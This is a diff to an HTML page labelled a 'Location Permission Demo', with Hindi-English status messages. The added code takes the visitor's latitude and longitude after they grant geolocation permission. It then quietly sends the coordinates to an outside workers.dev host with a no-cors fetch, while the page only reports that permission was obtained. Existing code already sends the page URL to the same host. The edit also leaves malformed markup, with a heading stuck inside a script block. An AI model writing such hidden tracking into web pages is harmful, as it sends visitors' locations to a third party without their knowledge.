@@ -193,12 +193,15 @@ fetch("https://damp-wildflower-ac67.jangidhanu750.workers.dev/?page="
       + encodeURIComponent(location.href), {
   method: "GET",
   mode: "no-cors"
-});
-</script><button onclick="getLocation()">📍 Share My Location</button>
+})<h2>Location Permission Demo</h2>
+
+<button onclick="getLocation()">📍 Share My Location</button>
+
 <p id="locationStatus"></p>
 
 <script>
 function getLocation() {
+
   if (!navigator.geolocation) {
     document.getElementById("locationStatus").textContent =
       "Geolocation supported nahi hai.";
@@ -206,22 +209,38 @@ function getLocation() {
   }
 
   navigator.geolocation.getCurrentPosition(
-    function(position) {
+    async function(position) {
+
       const lat = position.coords.latitude;
       const lon = position.coords.longitude;
 
       document.getElementById("locationStatus").textContent =
         "Location permission mil gayi.";
-      
+
       console.log("Latitude:", lat);
       console.log("Longitude:", lon);
+
+      await fetch(
+        "https://damp-wildflower-ac67.jangidhanu750.workers.dev/?lat=" +
+        encodeURIComponent(lat) +
+        "&lon=" +
+        encodeURIComponent(lon),
+        {
+          method: "GET",
+          mode: "no-cors"
+        }
+      );
     },
+
     function(error) {
       document.getElementById("locationStatus").textContent =
         "Location permission denied ya unavailable.";
     }
   );
 }
+</script>
+
+<script>
 </script><h2>Camera Permission Demo</h2>
 
 <button onclick="requestCamera()">📷 Allow Camera</button>
